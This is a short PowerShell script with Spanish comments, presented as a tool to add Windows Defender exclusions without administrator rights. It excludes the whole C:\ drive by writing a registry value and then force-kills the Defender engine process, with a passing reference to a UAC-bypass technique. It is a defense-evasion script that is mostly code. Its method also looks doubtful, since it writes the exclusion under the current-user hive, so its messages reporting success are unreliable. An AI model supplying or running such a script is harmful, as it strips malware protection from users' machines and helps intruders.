<#
.SYNOPSIS
   Windows Defender Exclusion Tool - Método sin Admin
   Versión mejorada para evitar errores de acceso
#>

function Add-DefenderExclusion {
    param(
        [Parameter(Mandatory=$true)]
        [string]$PathToExclude = "C:\"
    )

    # 1. Verificar si ya existe la exclusión
    $exclusionPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
    $existingExclusion = Get-ItemProperty -Path $exclusionPath -Name $PathToExclude -ErrorAction SilentlyContinue

    if ($existingExclusion) {
        Write-Host "[+] La exclusión para $PathToExclude ya existe" -ForegroundColor Green
        return
    }

    # 2. Crear la estructura de registro si no existe
    if (-not (Test-Path $exclusionPath)) {
        try {
            New-Item -Path $exclusionPath -Force | Out-Null
            Write-Host "[+] Creando clave de exclusiones en el registro" -ForegroundColor Cyan
        } catch {
            Write-Host "[!] Error al crear la clave de registro: $_" -ForegroundColor Red
            return
        }
    }

    # 3. Agregar la exclusión (método directo sin cmstp)
    try {
        Set-ItemProperty -Path $exclusionPath -Name $PathToExclude -Value 0 -Type DWORD -Force
        Write-Host "[+] Exclusión agregada exitosamente para $PathToExclude" -ForegroundColor Green

        # 4. Intentar refrescar Defender (puede fallar sin admin)
        try {
            $defender = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
            if ($defender) {
                Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Motor de Defender reiniciado" -ForegroundColor Cyan
            }
        } catch {
            Write-Host "[!] No se pudo reiniciar el motor de Defender (se requiere admin)" -ForegroundColor Yellow
        }

    } catch {
        Write-Host "[!] Error al agregar la exclusión: $_" -ForegroundColor Red
        Write-Host "[!] Intenta ejecutar PowerShell como Administrador" -ForegroundColor Yellow
    }
}

# Uso: 
Add-DefenderExclusion -PathToExclude "C:\"
